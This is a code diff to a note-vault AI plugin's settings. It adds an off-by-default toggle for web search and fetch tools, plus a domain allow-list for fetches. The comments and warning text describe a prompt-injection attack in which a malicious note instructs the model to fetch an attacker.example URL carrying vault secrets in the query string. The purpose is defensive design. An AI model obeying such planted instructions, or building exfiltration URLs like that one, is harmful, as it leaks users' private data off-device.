@@ -121,6 +121,29 @@ export interface SkaldSettings {
    * Disable if a downstream model misreads TOON output.
    */
   compactToolResults: boolean;
+  /**
+   * Web tools (web_search + web_fetch).
+   *
+   * SECURITY: web_fetch is a prompt-injection EXFILTRATION CHANNEL. skald
+   * reads vault notes into the model context, and web_fetch lets the model
+   * issue an outbound HTTP GET to an arbitrary URL — a malicious note can
+   * instruct the model to fetch `https://attacker.example/?leak=<secrets>`,
+   * smuggling private vault data off-device in the query string. These
+   * tools run provider-side with no per-URL approval hook, so the only
+   * defenses are (1) not shipping the tools and (2) a domain allow-list.
+   *
+   * webToolsEnabled: master switch. Default FALSE (off) — the channel is
+   *   closed unless the operator explicitly opts in. When false, neither
+   *   web_search nor web_fetch is sent to the model.
+   * webFetchAllowedDomains: when web tools are on, restrict web_fetch to
+   *   these domains via Anthropic's native server-side `allowed_domains`
+   *   parameter (Anthropic enforces it; defense-in-depth on top of the
+   *   on/off gate). Empty = no domain restriction. NOTE: OpenRouter does
+   *   not currently enforce this list — on OpenRouter routes the on/off
+   *   gate is the load-bearing defense. See docs/security-model.md.
+   */
+  webToolsEnabled: boolean;
+  webFetchAllowedDomains: string[];
 }
 
 /** Re-export for backwards-compatible imports. */
@@ -151,6 +174,13 @@ export const DEFAULT_SETTINGS: SkaldSettings = {
   startersPath: 'Skald/Starters.md',
   thinkingEnabled: false,
   compactToolResults: true,
+  // SECURITY default: web tools OFF. web_fetch is a prompt-injection
+  // exfiltration channel in a vault-reading agent; the safe default is to
+  // not ship it. Operators opt in (and may add a domain allow-list) in
+  // Advanced settings. This default is an operator/product decision — see
+  // docs/security-model.md "Web tools and prompt-injection exfiltration".
+  webToolsEnabled: false,
+  webFetchAllowedDomains: [],
 };
 
 /**
@@ -234,6 +264,16 @@ export function normalizeSettings(stored: unknown): SkaldSettings {
   out.memoryEnabled = bool('memoryEnabled');
   out.thinkingEnabled = bool('thinkingEnabled');
   out.compactToolResults = bool('compactToolResults');
+  // web_fetch is an exfiltration channel — the gate stays off unless data.json
+  // stores a real boolean true; any other value coerces to the safe default.
+  out.webToolsEnabled = bool('webToolsEnabled');
+
+  // webFetchAllowedDomains — keep only string entries from a stored array;
+  // anything else falls back to the default (empty = no allow-list, i.e. once
+  // web tools are explicitly enabled the model may fetch any URL).
+  out.webFetchAllowedDomains = Array.isArray(raw.webFetchAllowedDomains)
+    ? raw.webFetchAllowedDomains.filter((d): d is string => typeof d === 'string')
+    : DEFAULT_SETTINGS.webFetchAllowedDomains;
 
   // openaiBaseUrl — CLAMP against the https-enforcement rule. A hand-edited
   // cleartext (non-loopback) URL would otherwise be used verbatim by the
@@ -311,8 +351,75 @@ export class SkaldSettingTab extends PluginSettingTab {
             await this.plugin.saveSettings();
           });
         });
+
+      // Web tools (web_search + web_fetch) — SECURITY-sensitive, off by
+      // default. Toggling on re-renders so the allow-list field appears.
+      renderWebToolsSection(containerEl, this.plugin, redisplay);
     }
   }
+}
+
+/** Render the web-tools toggle plus, when enabled, the web_fetch domain
+ * allow-list. web_fetch is a prompt-injection exfiltration channel
+ * (see docs/security-model.md), so the toggle carries an explicit
+ * warning and the allow-list is offered as defense-in-depth. */
+function renderWebToolsSection(
+  containerEl: HTMLElement,
+  plugin: SkaldPlugin,
+  redisplay: () => void,
+): void {
+  new Setting(containerEl)
+    .setName('Web tools (web search + web fetch)')
+    .setDesc(
+      'Lets the model search the web and fetch URLs. SECURITY: web fetch can be ' +
+      'abused for data exfiltration — a malicious note in your vault can instruct ' +
+      'the model to fetch a URL with your vault contents in it, leaking data ' +
+      'off-device. Off by default. When on, set a domain allow-list below to ' +
+      'limit where fetches can go.',
+    )
+    .addToggle((t) => {
+      t.setValue(plugin.settings.webToolsEnabled).onChange(async (v) => {
+        plugin.settings.webToolsEnabled = v;
+        await plugin.saveSettings();
+        redisplay();
+      });
+    });
+
+  if (!plugin.settings.webToolsEnabled) return;
+
+  new Setting(containerEl)
+    .setName('Web fetch domain allow-list')
+    .setDesc(
+      'Comma- or newline-separated list of domains web fetch may access ' +
+      '(e.g. en.wikipedia.org, docs.anthropic.com). Enforced server-side by ' +
+      'Anthropic. Leave empty to allow any domain (not recommended — that ' +
+      'leaves the exfiltration channel open). Note: OpenRouter does not ' +
+      'enforce this list; on OpenRouter the only protection is turning web ' +
+      'tools off entirely.',
+    )
+    .addTextArea((ta) => {
+      ta.setPlaceholder('en.wikipedia.org\ndocs.anthropic.com');
+      ta.setValue(plugin.settings.webFetchAllowedDomains.join('\n'));
+      ta.onChange(async (raw) => {
+        plugin.settings.webFetchAllowedDomains = parseDomainList(raw);
+        await plugin.saveSettings();
+      });
+    });
+}
+
+/** Parse a free-text domain list (comma- and/or newline-separated) into a
+ * trimmed, de-duplicated array. Empty entries are dropped so a trailing
+ * separator or blank line never produces an empty `allowed_domains` entry
+ * (which Anthropic would read as "allow nothing"). */
+export function parseDomainList(raw: string): string[] {
+  return Array.from(
+    new Set(
+      raw
+        .split(/[\n,]/)
+        .map((d) => d.trim())
+        .filter((d) => d.length > 0),
+    ),
+  );
 }
 
 /** Render the Advanced toggle heading. Clicking it flips the expanded
